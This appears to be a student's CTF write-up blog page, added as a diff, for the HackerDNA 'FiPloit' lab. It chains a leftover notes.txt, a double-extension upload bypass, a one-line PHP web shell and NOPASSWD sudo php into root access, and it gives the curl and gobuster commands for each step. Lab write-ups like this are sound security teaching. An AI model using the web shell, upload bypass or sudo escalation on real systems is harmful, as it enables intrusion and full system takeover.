@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FiPloit CTF – File Upload to Root | Syed Mujtaba</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <!-- Same CSS as other writeups -->
+    <link rel="stylesheet" href="../../css/tutorial.css">
+</head>
+<body>
+<div class="container">
+    <div class="blog-header">
+        <h1><i class="fas fa-flag-checkered"></i> FiPloit – File Upload Bypass to Root</h1>
+        <p>CTF Writeup | HackerDNA Lab</p>
+        <a href="../main_page_blog.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Blogs</a>
+    </div>
+
+    <div class="post-tags">
+        <span class="tag">🏴 CTF</span>
+        <span class="tag">📁 File Upload Bypass</span>
+        <span class="tag">🔗 LFI Chain</span>
+        <span class="tag">🐚 Web Shell</span>
+        <span class="tag">🔑 Privilege Escalation</span>
+    </div>
+
+    <div class="blog-meta-line">
+        <span><i class="far fa-calendar-alt"></i> May 2026</span>
+        <span><i class="fas fa-user-astronaut"></i> Syed Mujtaba Zaidi</span>
+        <span><i class="fas fa-graduation-cap"></i> BS Cyber Security, Riphah</span>
+    </div>
+
+    <div class="blog-content">
+        <p><strong>Lab Reference:</strong> <a href="https://hackerdna.com/labs/fiploit" target="_blank">https://hackerdna.com/labs/fiploit</a></p>
+        <p>This writeup covers the complete attack chain for <strong>FiPloit</strong> — a PHP web application with insufficient file upload controls. The chain goes from developer notes discovery → hidden upload endpoint → double extension bypass → web shell RCE → sudo PHP privilege escalation to root.</p>
+
+        <h2>🔍 Reconnaissance</h2>
+        <p>Started with basic service enumeration on the target. The application was running on port 8080.</p>
+        <pre><code>curl -I "http://TARGET:8080/index.php"</code></pre>
+        <p>Response headers revealed <code class="inline-code">X-Powered-By: PHP/8.3.24</code> — no WAF detected. The visible pages were only <code class="inline-code">index.php</code>, <code class="inline-code">about.php</code>, and <code class="inline-code">contact.php</code>.</p>
+
+        <h2>📂 Directory & File Enumeration</h2>
+        <p>Used Gobuster with a large wordlist and response-length filtering to remove false positives. The application was returning consistent fake responses (length 2664, 541–547) for non-existent paths, so these were excluded.</p>
+        <pre><code>gobuster dir -u http://TARGET:8080 \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
+  -x php,txt,bak,old \
+  --exclude-length 2664,541,542,543,544,545,546,547 \
+  -t 20</code></pre>
+        <p>This surfaced <code class="inline-code">header.php</code> and <code class="inline-code">footer.php</code> but nothing critical yet.</p>
+
+        <h2>📝 Developer Notes Discovery</h2>
+        <p>After switching focus to exposed text files — a common developer mistake — a plain <code class="inline-code">notes.txt</code> file was found in the web root:</p>
+        <pre><code>curl http://TARGET:8080/notes.txt</code></pre>
+        <p>The file contained developer notes including a reference to a hidden PHP endpoint that was not yet removed before deployment. This is a classic example of sensitive information left in a publicly accessible file.</p>
+
+        <div class="warning-box">
+            ⚠️ <strong>Important:</strong> Flag values and exact credential content are omitted per writeup guidelines.
+        </div>
+
+        <h2>📤 Hidden Upload Endpoint</h2>
+        <p>The endpoint discovered via <code class="inline-code">notes.txt</code> was a log file upload page. It presented a form accepting only <code class="inline-code">.txt</code> files — enforced client-side and by extension check only.</p>
+        <pre><code>curl -s "http://TARGET:8080/[hidden-endpoint].php"</code></pre>
+        <p>The upload form label confirmed: <em>"Select .txt file"</em>. A standard PHP shell upload was rejected.</p>
+
+        <h2>💣 Double Extension Bypass</h2>
+        <p>The server was filtering only by the first extension check. By using a double extension filename (<code class="inline-code">.txt.php</code>), the filter saw <code class="inline-code">.txt</code> and allowed the upload — but PHP executed it as <code class="inline-code">.php</code> because that is the final extension.</p>
+        <pre><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.txt.php
+
+curl -s -X POST "http://TARGET:8080/[hidden-endpoint].php" \
+  -F "file=@shell.txt.php"</code></pre>
+        <p>Server responded with a success message. The file was saved under the <code class="inline-code">/uploads/</code> directory.</p>
+
+        <h2>🐚 Remote Code Execution</h2>
+        <p>Direct access to the uploaded shell confirmed PHP execution:</p>
+        <pre><code>curl "http://TARGET:8080/uploads/shell.txt.php?cmd=id"
+# Output: uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</code></pre>
+        <p>From here, the user flag was retrieved from the home directory of the <code class="inline-code">ctf</code> user (content omitted).</p>
+
+        <h2>⚙️ Privilege Escalation – sudo PHP</h2>
+        <p>Checked sudo permissions for the current user:</p>
+        <pre><code>sudo -l</code></pre>
+        <p>Output showed the <code class="inline-code">ctf</code> user could run <code class="inline-code">/usr/bin/php</code> as root with no password required. This is a classic GTFOBins misconfiguration.</p>
+        <pre><code>curl -G "http://TARGET:8080/uploads/shell.txt.php" \
+  --data-urlencode "cmd=sudo php -r 'echo file_get_contents(\"/root/flag-root.txt\");'"</code></pre>
+        <p>This executed PHP as root, directly reading the root flag. Full system compromise achieved.</p>
+
+        <div class="note-box">
+            🧠 <strong>Key Takeaways:</strong><br><br>
+            • Never leave developer notes, backup files, or <code class="inline-code">.txt</code> files in the web root — they expose internal structure.<br>
+            • File upload filters must validate MIME type and content, not just extension — double extensions bypass naive checks.<br>
+            • NOPASSWD sudo entries for interpreters like <code class="inline-code">php</code>, <code class="inline-code">python</code>, or <code class="inline-code">perl</code> grant instant root — always audit sudo rules.<br>
+            • Uploaded files should never be stored in a web-accessible directory if execution is possible.<br>
+            • Response length filtering is essential during enumeration to remove application-level false positives.
+        </div>
+
+        <h2>🛠️ Tools Used</h2>
+        <ul>
+            <li>Gobuster – directory and file enumeration</li>
+            <li>curl – manual HTTP requests and file upload</li>
+            <li>FFUF – parameter fuzzing</li>
+            <li>Nikto – web server scanning</li>
+            <li>SecLists – wordlists (raft-large-files, burp-parameter-names)</li>
+            <li>Linux command line – shell interaction and privilege escalation</li>
+        </ul>
+
+        <p>FiPloit is a great lab for understanding how small developer mistakes — a leftover notes file, a weak upload filter, and an overpermissive sudo rule — chain together into full system compromise.</p>
+    </div>
+
+    <div class="blog-footer">
+        <a href="../main_page_blog.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to all blogs</a>
+    </div>
+</div>
+</body>
+</html>
